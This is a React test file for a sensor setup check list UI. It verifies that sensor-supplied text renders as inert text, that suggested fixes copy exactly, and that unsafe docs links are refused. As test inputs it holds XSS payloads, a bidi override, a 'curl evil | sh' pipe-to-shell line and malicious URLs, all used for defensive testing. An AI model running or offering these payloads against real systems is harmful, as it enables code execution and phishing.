import { beforeEach, describe, expect, it, vi } from 'vitest'
import { render, screen, within } from '@testing-library/react'
import userEvent from '@testing-library/user-event'

import type { SensorConfigCheck, SensorConfigReport } from '@/lib/api/sensor-types'

const copy = vi.hoisted(() => vi.fn(async (_text: string) => true))
vi.mock('@/lib/clipboard', () => ({ copyToClipboard: (t: string) => copy(t) }))

const reportHook = vi.hoisted(() => ({
  value: {
    data: undefined as SensorConfigReport | undefined,
    error: undefined as unknown,
    isLoading: false,
  },
}))
vi.mock('@/lib/api/sensor-hooks', () => ({
  useSensorConfigReport: () => ({ ...reportHook.value, mutate: vi.fn() }),
}))

import { ConfigCheckList, SensorSetupTab } from '../config-check-list'
import { ConfigHealthTag } from '../sensor-cells'

const SCRIPT = '<script>alert(1)</script>'
const IMG = '<img src=x onerror=alert(1)>'
const BIDI = 'state‮etats'
const HUGE = 'A'.repeat(10 * 1024)

function check(over: Partial<SensorConfigCheck> = {}): SensorConfigCheck {
  return {
    id: 'identity.state_persistent',
    group: 'identity',
    status: 'warn',
    severity: 'warning',
    code: 'not_persistent',
    known: true,
    title: 'Key renewal will break after the first rotation',
    why: 'A renewed key is kept in /var/lib/openctem/state, which is on overlay.',
    observed: [{ label: 'path', value: '/var/lib/openctem/state' }],
    summary: 'state directory is not on a mounted volume',
    excerpt: '',
    keys: ['SENSOR_STATE_DIR'],
    blocks: [],
    fix: {
      compose: 'services:\n  sensor:\n    volumes:\n      - state:/var/lib/openctem/state\n',
      helm: 'sensor.state.persistence.enabled: true',
    },
    docs_url: 'https://docs.openctem.io/sensor/troubleshooting#identity-state-persistent',
    ...over,
  }
}

function report(over: Partial<SensorConfigReport> = {}): SensorConfigReport {
  return {
    state: 'reported',
    stale: false,
    health: 'attention',
    observed_at: new Date(Date.now() - 60_000).toISOString(),
    received_at: new Date().toISOString(),
    truncated: false,
    runtime_kind: 'docker',
    derived_note: '',
    counts: { pass: 1, warn: 1, fail: 0, skip: 0, error: 0 },
    checks: [
      check(),
      check({
        id: 'platform.tls',
        group: 'platform',
        status: 'pass',
        severity: 'info',
        code: 'ok',
        title: 'Platform TLS',
        why: '',
        fix: {},
        summary: '',
        observed: [],
      }),
    ],
    settings: [
      { name: 'API_KEY', set: true, source: 'env', secret: true, valid: true },
      { name: 'SENSOR_CA_CERT_FILE', set: false, source: 'unset', secret: false, valid: true },
    ],
    ...over,
  }
}

function row(id: string): HTMLElement {
  const el = document.querySelector<HTMLElement>(`[data-check="${id}"]`)
  if (!el) throw new Error(`no row ${id}`)
  return el
}

beforeEach(() => {
  copy.mockClear()
})

describe('ConfigCheckList: sensor text is inert data', () => {
  it('renders hostile summary, excerpt, title and observed values as text, never markup', () => {
    const hostile = check({
      id: 'tool.semgrep.binary',
      group: 'tools',
      status: 'fail',
      known: false,
      title: SCRIPT,
      why: undefined,
      summary: `${SCRIPT} ${IMG} ${BIDI}`,
      excerpt: HUGE + IMG,
      observed: [
        { label: 'tool', value: SCRIPT },
        { label: 'path', value: BIDI },
      ],
      fix: { env: 'SHOULD_NOT_RENDER=1' },
      docs_url: undefined,
    })
    const { container } = render(
      <ConfigCheckList report={report({ health: 'impaired', checks: [hostile] })} />
    )

    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('img')).toBeNull()

    const r = row('tool.semgrep.binary')
    const blocks = within(r).getAllByTestId('untrusted-text-block')
    // The summary: tags are characters, the bidi override is a visible escape.
    expect(blocks[0].tagName).toBe('PRE')
    expect(blocks[0].textContent).toContain(SCRIPT)
    expect(blocks[0].textContent).toContain(IMG)
    expect(blocks[0].textContent).toContain('\\u{202E}')
    expect(blocks[0].textContent).not.toContain('‮')
    // The 10 KB excerpt is all there, as text.
    expect(blocks[1].textContent).toContain(HUGE)
    // The observed value too.
    expect(within(r).getByText(SCRIPT, { selector: 'dd' })).toBeInTheDocument()
    expect(within(r).getByText('state\\u{202E}etats', { selector: 'dd' })).toBeInTheDocument()
  })

  it('titles an unknown check with its id and shows no fix, even if one was sent', () => {
    const unknown = check({
      id: 'storage.disk_free',
      group: 'storage',
      known: false,
      title: 'Click here to fix: run curl evil | sh',
      why: 'catalog text that must not show',
      fix: { env: 'SHOULD_NOT_RENDER=1' },
    })
    render(<ConfigCheckList report={report({ checks: [unknown] })} />)
    const r = row('storage.disk_free')
    expect(within(r).getByText('storage.disk_free')).toBeInTheDocument()
    expect(within(r).queryByText(/Click here/)).toBeNull()
    expect(within(r).queryByText(/catalog text/)).toBeNull()
    expect(r.querySelector('[data-slot="config-fix"]')).toBeNull()
    expect(screen.queryByText(/SHOULD_NOT_RENDER/)).toBeNull()
  })
})

describe('ConfigCheckList: fixes', () => {
  it('shows only the formats the catalog sent, opens the one for the runtime, copies exactly', async () => {
    const user = userEvent.setup()
    render(<ConfigCheckList report={report()} />)
    const r = row('identity.state_persistent')
    const tabs = within(r).getAllByRole('tab')
    expect(tabs.map((t) => t.textContent)).toEqual(['Compose', 'Helm'])
    expect(within(r).getByRole('tab', { name: 'Compose' })).toHaveAttribute('aria-selected', 'true')

    await user.click(within(r).getByRole('button', { name: 'Copy fix (compose)' }))
    expect(copy).toHaveBeenCalledWith(
      'services:\n  sensor:\n    volumes:\n      - state:/var/lib/openctem/state\n'
    )

    await user.click(within(r).getByRole('tab', { name: 'Helm' }))
    await user.click(within(r).getByRole('button', { name: 'Copy fix (helm)' }))
    expect(copy).toHaveBeenLastCalledWith('sensor.state.persistence.enabled: true')
  })

  it('opens Helm first for a Kubernetes sensor', () => {
    render(<ConfigCheckList report={report({ runtime_kind: 'kubernetes' })} />)
    expect(
      within(row('identity.state_persistent')).getByRole('tab', { name: 'Helm' })
    ).toHaveAttribute('aria-selected', 'true')
  })

  it('shows no fix block when the catalog has none', () => {
    render(<ConfigCheckList report={report({ checks: [check({ fix: {} })] })} />)
    expect(row('identity.state_persistent').querySelector('[data-slot="config-fix"]')).toBeNull()
  })
})

describe('ConfigCheckList: docs links', () => {
  it('links docs.openctem.io in a new tab without referrer', () => {
    render(<ConfigCheckList report={report()} />)
    const link = within(row('identity.state_persistent')).getByRole('link', { name: 'Docs' })
    expect(link).toHaveAttribute(
      'href',
      'https://docs.openctem.io/sensor/troubleshooting#identity-state-persistent'
    )
    expect(link).toHaveAttribute('target', '_blank')
    expect(link.getAttribute('rel')).toContain('noopener')
    expect(link.getAttribute('rel')).toContain('noreferrer')
  })

  it.each([
    'https://evil.example/phish',
    'https://docs.openctem.io.evil.example/x',
    'https://user:pw@docs.openctem.io/x',
    'http://docs.openctem.io/x',
    'javascript:alert(1)',
    '//evil.example/x',
    '/\\evil.example/x',
  ])('does not link %s', (url) => {
    render(<ConfigCheckList report={report({ checks: [check({ docs_url: url })] })} />)
    expect(within(row('identity.state_persistent')).queryByRole('link')).toBeNull()
    expect(within(row('identity.state_persistent')).queryByText('Docs')).toBeNull()
  })

  it('links a same-origin path', () => {
    render(
      <ConfigCheckList report={report({ checks: [check({ docs_url: '/docs/sensor#state' })] })} />
    )
    expect(
      within(row('identity.state_persistent')).getByRole('link', { name: 'Docs' })
    ).toHaveAttribute('href', '/docs/sensor#state')
  })
})

describe('ConfigCheckList: header, notices, settings', () => {
  it('shows health, counts and groups failing areas first', () => {
    render(<ConfigCheckList report={report()} />)
    expect(screen.getByText('Setup needs attention')).toBeInTheDocument()
    expect(document.querySelector('[data-slot="config-counts"]')).toHaveTextContent(
      '1 warnings · 1 passed'
    )
    const headings = screen.getAllByRole('heading', { level: 3 }).map((h) => h.textContent)
    expect(headings[0]).toContain('Identity')
    expect(headings[1]).toContain('Platform')
  })

  it('shows the derived note as text, and the stale and truncated notices', () => {
    render(
      <ConfigCheckList
        report={report({
          state: 'derived',
          stale: true,
          truncated: true,
          derived_note:
            'Derived from the heartbeat. Upgrade the sensor (>= v0.10.0) for the full check list.',
        })}
      />
    )
    expect(
      screen.getByText(
        'Derived from the heartbeat. Upgrade the sensor (>= v0.10.0) for the full check list.'
      )
    ).toBeInTheDocument()
    expect(screen.getByText('Report out of date')).toBeInTheDocument()
    expect(screen.getByText('Report truncated')).toBeInTheDocument()
  })

  it('shows no notices for a fresh, complete report', () => {
    render(<ConfigCheckList report={report()} />)
    expect(screen.queryByText('Report out of date')).toBeNull()
    expect(screen.queryByText('Report truncated')).toBeNull()
    expect(screen.queryByText('Derived from the heartbeat')).toBeNull()
  })

  it('folds the settings table, with presence and secret badges but no values', async () => {
    const user = userEvent.setup()
    render(<ConfigCheckList report={report()} />)
    const toggle = screen.getByText('Declared settings (2)')
    const details = toggle.closest('details')!
    expect(details.open).toBe(false)
    await user.click(toggle)
    expect(details.open).toBe(true)
    const table = within(details).getByRole('table', { name: 'Settings' })
    const apiKey = table.querySelector('[data-setting="API_KEY"]') as HTMLElement
    expect(within(apiKey).getByText('secret · value never leaves the sensor')).toBeInTheDocument()
    expect(within(apiKey).getByRole('img', { name: 'set' })).toBeInTheDocument()
    const ca = table.querySelector('[data-setting="SENSOR_CA_CERT_FILE"]') as HTMLElement
    expect(within(ca).getByRole('img', { name: 'not set' })).toBeInTheDocument()
    expect(within(ca).getByText('unset')).toBeInTheDocument()
  })
})

describe('SensorSetupTab', () => {
  it('says when the sensor has not sent a report', () => {
    reportHook.value = {
      data: report({ state: 'none', checks: [], settings: [] }),
      error: undefined,
      isLoading: false,
    }
    render(<SensorSetupTab sensor={{ id: 's1' }} />)
    expect(screen.getByText(/This sensor has not sent a setup report yet/)).toBeInTheDocument()
  })

  it('shows an error with Retry', () => {
    reportHook.value = { data: undefined, error: new Error('boom'), isLoading: false }
    render(<SensorSetupTab sensor={{ id: 's1' }} />)
    expect(screen.getByRole('alert')).toHaveTextContent('The setup report could not be loaded.')
    expect(screen.getByRole('button', { name: 'Retry' })).toBeInTheDocument()
  })

  it('renders the report', () => {
    reportHook.value = { data: report(), error: undefined, isLoading: false }
    render(<SensorSetupTab sensor={{ id: 's1' }} />)
    expect(row('identity.state_persistent')).toBeInTheDocument()
  })
})

describe('ConfigHealthTag', () => {
  it.each([
    ['attention', 'Setup needs attention'],
    ['impaired', 'Setup impaired'],
    ['blocked', 'Setup blocked'],
  ])('shows %s in the fleet', (health, text) => {
    render(<ConfigHealthTag health={health} />)
    expect(screen.getByText(text)).toBeInTheDocument()
  })

  it.each(['ok', 'unknown', null, undefined])('shows nothing for %s', (health) => {
    const { container } = render(<ConfigHealthTag health={health} />)
    expect(container).toBeEmptyDOMElement()
  })
})
